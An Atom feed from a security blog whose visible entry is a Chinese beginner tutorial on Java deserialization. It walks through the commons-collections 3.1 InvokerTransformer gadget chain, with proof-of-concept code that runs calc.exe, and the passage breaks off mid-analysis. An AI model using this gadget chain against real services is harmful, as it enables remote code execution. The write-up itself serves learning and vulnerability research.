<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>b1ue0cean&#39;s   blog</title>
  
  <subtitle>welcome to my world -- sharing CTF &amp; ML skills</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-06-21T13:11:44.336Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>b1ue0cean</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Java安全入门(三)--RMI&amp;JNDI</title>
    <link href="http://example.com/2022/06/21/java-sec-3/"/>
    <id>http://example.com/2022/06/21/java-sec-3/</id>
    <published>2022-06-21T13:03:52.000Z</published>
    <updated>2022-06-21T13:11:44.336Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="c309eb726f548be61c3c78f6bd799624d7dd5b96c98b890d2dd53ae67f3ea314"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="java-sec" scheme="http://example.com/categories/java-sec/"/>
    
    
    <category term="java-sec" scheme="http://example.com/tags/java-sec/"/>
    
  </entry>
  
  <entry>
    <title>Java安全入门(二)--fastjson漏洞研究</title>
    <link href="http://example.com/2022/06/21/java-sec-2/"/>
    <id>http://example.com/2022/06/21/java-sec-2/</id>
    <published>2022-06-21T13:03:44.000Z</published>
    <updated>2022-06-21T13:11:57.501Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="f38958f3cd0d7a1b2f26c6311bda8f70bb0d4584ab4ed5c2290f1b4bd3a9c1d9"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="java-sec" scheme="http://example.com/categories/java-sec/"/>
    
    
    <category term="java-sec" scheme="http://example.com/tags/java-sec/"/>
    
  </entry>
  
  <entry>
    <title>Java安全入门(一)</title>
    <link href="http://example.com/2022/06/21/java-sec-1/"/>
    <id>http://example.com/2022/06/21/java-sec-1/</id>
    <published>2022-06-21T13:03:34.000Z</published>
    <updated>2022-06-21T13:11:08.130Z</updated>
    
    <content type="html"><![CDATA[<p>快一年前写的文章？自从决定走留学道路 web研究这方面进度慢了太多了吧 生活充满了艰辛和无奈啊  继续拾起来了</p><span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前在西二在线白嫖了一学期的java 虽说能开发 但安全这块确实没怎么去了解过 一直说要搞java 一直都没抽出时间（暑假颓废了</p><p>今天 下定决心 来搞搞java</p><h2 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h2><blockquote><p>序列化是让Java对象脱离Java运行环境的一种手段，可以有效的实现多平台之间的通信、对象持久化存储。</p><p>Java 序列化是指把 Java 对象转换为字节序列的过程便于保存在内存、文件、数据库中，ObjectOutputStream类的 writeObject() 方法可以实现序列化。反序列化是指把字节序列恢复为 Java 对象的过程，ObjectInputStream 类的 readObject() 方法用于反序列化。</p></blockquote><p>这里做个演示反序列化过程</p><h3 id="简单地反序列化"><a href="#简单地反序列化" class="headerlink" title="简单地反序列化"></a>简单地反序列化</h3><p>创建一个员工类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Employee</span> <span class="keyword">implements</span> <span class="title class_">java</span>.io.Serializable &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> String identify;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">mailCheck</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;This is the&quot;</span>+<span class="built_in">this</span>.identify+<span class="string">&quot;of our company&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建一个员工对象并将其反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializeDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Employee</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Employee</span>();</span><br><span class="line">        e.name = <span class="string">&quot;员工甲&quot;</span>;</span><br><span class="line">        e.identify = <span class="string">&quot;General staff&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fileOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./src/employee11.txt&quot;</span>);</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOut);</span><br><span class="line"></span><br><span class="line">            out.writeObject(e);</span><br><span class="line">            out.close();</span><br><span class="line">            fileOut.close();</span><br><span class="line">            System.out.println(<span class="string">&quot;Serialized data is saved in employee1.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException fileNotFoundException) &#123;</span><br><span class="line">            fileNotFoundException.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnSerializeDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Employee</span> <span class="variable">e</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./src/employee1.txt&quot;</span>);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line"></span><br><span class="line">            e = (Employee)  inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | ClassNotFoundException fileNotFoundException) &#123;</span><br><span class="line">            fileNotFoundException.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Deserialized Employee ...&quot;</span>);</span><br><span class="line">        <span class="keyword">assert</span> e != <span class="literal">null</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;Name:&quot;</span>+ e.name);</span><br><span class="line">        System.out.println(<span class="string">&quot;This is the&quot;</span> + e.identify+<span class="string">&quot;of our company&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会写java再来看就是爽！哦哦哦</p><h3 id="反序列化漏洞原理"><a href="#反序列化漏洞原理" class="headerlink" title="反序列化漏洞原理"></a>反序列化漏洞原理</h3><p>在Java反序列化中，会调用被反序列化的readObject方法，当readObject方法书写不当时就会引发漏洞。</p><p>PS：有时也会使用readUnshared()方法来读取对象，readUnshared()不允许后续的readObject和readUnshared调用引用这次调用反序列化得到的对象，而readObject读取的对象可以。</p><p>简单的原理   利用危险类 –&gt; 实现rce</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">//创建UnsafeClass类对象</span></span><br><span class="line">        <span class="type">UnsafeClass</span> <span class="variable">Unsafe</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnsafeClass</span>();</span><br><span class="line">        Unsafe.name = <span class="string">&quot;hacked by b1ue0cean&quot;</span>;</span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line"></span><br><span class="line">        os.writeObject(Unsafe);</span><br><span class="line">        os.close();</span><br><span class="line">        <span class="comment">//恢复对象</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line"></span><br><span class="line">        <span class="type">UnsafeClass</span> <span class="variable">objectFromDisk</span> <span class="operator">=</span> (UnsafeClass) ois.readObject();</span><br><span class="line">        System.out.println(objectFromDisk);</span><br><span class="line">        ois.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UnsafeClass</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="commons-collections-3-1-反序列化分析"><a href="#commons-collections-3-1-反序列化分析" class="headerlink" title="commons-collections-3.1 反序列化分析"></a>commons-collections-3.1 反序列化分析</h2><h3 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h3><p>环境 </p><p><a href="http://mvnrepository.com/artifact/commons-collections/commons-collections/3.1">http://mvnrepository.com/artifact/commons-collections/commons-collections/3.1</a> 用maven直接下</p><p>我的是 java15 emmm 凑合看吧</p><p>新建个maven项目  直接把那一段拉下来 到pom中即可</p><p><img src="/2022/06/21/java-sec-1/image-20211026201931778.png" alt="image-20211026201931778"></p><p><img src="/2022/06/21/java-sec-1/image-20211026202228431.png" alt="image-20211026202228431"></p><p>这里有个小插曲 我们用的java15 版本过高 要在 pom 中添加</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>15<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>15<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br></pre></td></tr></table></figure><p>之后在刷一下maven 在右边就可以看到了 我们已经下载下来了</p><h3 id="拿条链子来分析"><a href="#拿条链子来分析" class="headerlink" title="拿条链子来分析"></a>拿条链子来分析</h3><p>我们开始分析了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="comment">//传入Runtime类</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，然后getMethod方法再反射调用getRuntime方法，返回Runtime.getRuntime()方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，然后反射执行Runtime.getRuntime()方法，返回Runtime实例化对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        serialize(transformerChain);</span><br><span class="line">        unserialize();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Transformer obj)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test.ser&quot;</span>));</span><br><span class="line">            os.writeObject(obj);</span><br><span class="line">            os.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test.ser&quot;</span>));</span><br><span class="line">            <span class="type">ChainedTransformer</span> <span class="variable">obj</span> <span class="operator">=</span> (ChainedTransformer) is.readObject();</span><br><span class="line">            obj.transform(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大佬写好了的poc </p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在<code>org/apache/commons/collections/functors/InvokerTransformer.java</code>，它继承了Transformer和Serializable接口（可以被序列化），内部的<code>transform</code>函数进行了反射操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException var7) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, var7);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里补充一点反射的知识</p><h3 id="反射（框架设计的灵魂）"><a href="#反射（框架设计的灵魂）" class="headerlink" title="反射（框架设计的灵魂）"></a>反射（框架设计的灵魂）</h3><p>将类的各个部分封装为其他对象<br>好处：</p><ol><li>可以在程序运行过程中操作对象</li><li>可以解耦<br><img src="/2022/06/21/java-sec-1/lalal.png" alt="lalal"></li></ol><p>获取Class对象的方式：（分别对应上图的三个截断和）</p><ol><li>Class.forName(“全类名”): 将字节码文件加载进内存，返回Class对象</li><li>类名.class ： 通过类名的属性class 获取</li><li>对象.getClass : getClass() 方法再object类中定义这</li></ol><p>反射的几个重要用法：</p><ul><li>获取哦欸的方法：forName</li><li>实例化类对象的方法：newInstance</li><li>获取函数的方法： getMethod</li><li>执行函数的方法：invoke</li></ul><p>基本上这几个方法包揽了java安全里各种和反射有关的 Payload<br>在安全研究中我们使用反射的一大目的， 就是绕过某些沙盒。 比如， 上下文中如果只有 Integer 类型的数字， 我们如何获取到可以执行命令的 Runtime 类呢》 也许可以这样</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)</span><br></pre></td></tr></table></figure><p>forName 有两个函数重载</p><ul><li><code>Class&lt;?&gt; forName(String name)</code></li><li><code>Class&lt;?&gt; forName(String name, **boolean** initialize , ClassLoader loader)</code></li></ul><p>第一个就是我们常见的获取class的方式， 其实可以理解为第二种方式的一个封装：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(className)</span><br><span class="line"><span class="comment">// 等于</span></span><br><span class="line">Class.forName(className,<span class="literal">true</span>,currentLoader)</span><br></pre></td></tr></table></figure><h3 id="继续分析"><a href="#继续分析" class="headerlink" title="继续分析"></a>继续分析</h3><p>根据上面的分析 是不是已经感觉到危险了呢？</p><p>只需在相应位置补足反射所需的数据类型即可RCE：</p><ul><li>input：Class.forName(“java.lang.Runtime”).getMethod(“getRuntime”).invoke(null) //获得Runtime实例</li><li>iMethodName：“exec”</li><li>iParamTypes：String.class</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">input</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">evil</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        evil.transform(input);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功弹出计算器</p><p>在需要补足的类型中，<code>iMethodName</code>与<code>iParamTypes</code>在<code>InvokerTransformer</code>构造函数中被赋值，即在初始化<code>iTransformers</code>时给定参数即可，现在只需要我们解决<code>input</code>来源。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.iMethodName = methodName;</span><br><span class="line">    <span class="built_in">this</span>.iParamTypes = paramTypes;</span><br><span class="line">    <span class="built_in">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这时候建议 download source 把源码下载下来 跟的更爽一些</p><h4 